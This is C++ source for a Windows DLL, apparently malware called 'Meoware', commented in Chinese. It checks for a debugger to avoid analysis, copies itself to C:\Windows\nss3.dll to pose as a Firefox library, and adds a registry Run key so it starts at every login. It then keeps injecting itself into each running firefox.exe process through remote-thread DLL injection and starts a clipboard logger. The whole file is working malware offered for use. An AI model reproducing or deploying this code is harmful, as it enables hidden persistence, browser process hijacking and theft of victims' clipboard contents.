#include "pch.h"
#include <string>
#include <thread>
#include "loader.h"
#include "persistence.h"
#include "dynamic_library.h"
#include "ClipboardLogger.h"
#include "utils.h"

HINSTANCE hdll = NULL;

// rundll32.exe HookFireFox.dll,StartMalware
// 匯出的注入函數，將 HookFireFox.dll 持續注入到 firefox.exe 中
extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
    if (IsDebuggerPresent()) {
        return;
    }

    Log("log.txt", "[+] loader: 建立 Mutex.\n");
    // 1. 宣告互斥體控制代碼
    HANDLE hMutex = NULL;
    const char* mutexName = "Meoware"; // 2. 設定唯一的互斥體名稱

    // 2. 建立或開啟具名互斥體
    hMutex = CreateMutexA(NULL, FALSE, mutexName);
    if (hMutex == NULL) {
        Log("log.txt", "[+] loader: create mutex failed.\n");
        return;
    }

    // 3. 檢查互斥體是否已存在
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        Log("log.txt", "[+] loader: 程式已經在執行了.\n");
        return;
    }

    std::string path = GetCurrentDllPath();
    std::string target_path = "C:\\Windows\\nss3.dll";

    Log("log.txt", "[+] loader: 移動本體以及自我啟動.\n");
    if (!CopyFile(toUTF16(path).c_str(), toUTF16(target_path).c_str(), FALSE))
    {
        Log("log.txt", "[+] loader: self copy failed.\n");
        WriteRegistryRun("meoware", "C:\\Windows\\System32\\rundll32.exe", path + ",StartMalware");
    }
    else
    {
        DeleteFile(toUTF16(path).c_str());
        WriteRegistryRun("meoware", "C:\\Windows\\System32\\rundll32.exe", target_path + ",StartMalware");
    }

    Log("log.txt", "[+] loader: create inject thread.\n");
    std::thread threadInjectTargets(RepeatInjectTargets);
    threadInjectTargets.join();

    Log("log.txt", "[+] loader: create clip board listener thread.\n");
    std::thread ClipBoardListener(ClipboardLogger);
    ClipBoardListener.join();
}

std::vector<DWORD> injected_pids;

BOOL VectorContain(std::vector<DWORD> vec, DWORD val)
{
    for (DWORD v : vec) {
        if (v == val) return TRUE;
    }

    return FALSE;
}

// 注入 dll 的函數，會不斷擷取當前找到的所有 firefox.exe 的 process，然後注入 dll
BOOL RepeatInjectTargets()
{
    Log("log.txt", "[+] loader: start injecting.\n");
    while (1)
    {
        std::vector<DWORD> pids = GetProcessIDByName(L"firefox.exe");
        for (DWORD pid : pids)
        {
            if (VectorContain(injected_pids, pid)) continue;
            Log("log.txt", "[+] loader: injecting firefox.exe pid=" + std::to_string(pid) + ".\n");
            injected_pids.push_back(pid);
            InjectDll(pid, toUTF16(GetCurrentDllPath()));
        }

        GetProcFromDll<Sleep_t>(hdll, "Sleep", "kernel32.dll")(2000);
    }
}

// 注入指定 pid 的 process，dllPath 的 dll
BOOL InjectDll(DWORD pid, const std::wstring& dllPath)
{
    // 1. OpenProcess 開啟目標 Process
    HANDLE hProcess = GetProcFromDll<OpenProcess_t>(hdll, "OpenProcess", "kernel32.dll")(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == nullptr)
    {
        DWORD error = GetLastError();
        Log("log.txt", "[-] loader: open process failed, error=" + std::to_string(error) + ".\n");
        return FALSE;
    }

    // 2. VirtualAllocEx 在目標 Process 申請一塊記憶體
    LPVOID pRemoteMemory = GetProcFromDll<VirtualAllocEx_t>(hdll, "VirtualAllocEx", "kernel32.dll")(hProcess, nullptr, dllPath.size() * sizeof(wchar_t), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (pRemoteMemory == nullptr)
    {
        DWORD error = GetLastError();
        Log("log.txt", "[-] loader: alloc remote memory failed, error=" + std::to_string(error) + ".\n");
        CloseHandle(hProcess);
        return FALSE;
    }
    

    // 3. WriteProcessMemory 將 DLL 路徑寫入目標 Process
    if (!WriteProcessMemory(hProcess, pRemoteMemory, dllPath.data(), dllPath.size() * sizeof(wchar_t), nullptr))
    {
        DWORD error = GetLastError();
        Log("log.txt", "[-] loader: write dll path to remote mem failed, error=" + std::to_string(error) + ".\n");
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 4. GetProcAddress 取得 LoadLibrary 函數
    HINSTANCE hkernel32dLL = GetModuleHandle(L"kernel32.dll");
    if (hkernel32dLL == NULL)
    {
        DWORD error = GetLastError();
        Log("log.txt", "[-] loader: get kernel32.dll handle failed, error=" + std::to_string(error) + ".\n");
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    LPVOID pLoadLibrary = (LPVOID)GetProcAddress(hkernel32dLL, "LoadLibraryW");
    if (pLoadLibrary == nullptr)
    {
        DWORD error = GetLastError();
        Log("log.txt", "[-] loader: get LoadLibraryW failed, error=" + std::to_string(error) + ".\n");
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    // 5. CreateRemoteThread 在目標 Process 載入 DLL
    HANDLE hRemoteThread =
        CreateRemoteThread(hProcess, nullptr, 0, (LPTHREAD_START_ROUTINE)pLoadLibrary, pRemoteMemory, 0, nullptr);
    if (hRemoteThread == nullptr)
    {
        DWORD error = GetLastError();
        Log("log.txt", "[-] loader: create remote thread failed, error=" + std::to_string(error) + ".\n");
        VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }
    
    if (WaitForSingleObject(hRemoteThread, INFINITE) != WAIT_OBJECT_0)
    {
        DWORD error = GetLastError();
        Log("log.txt", "[-] loader: thread execute failed, error=" + std::to_string(error) + ".\n");
        return FALSE;
    }

    VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE);
    CloseHandle(hRemoteThread);
    CloseHandle(hProcess);
    return TRUE;
}
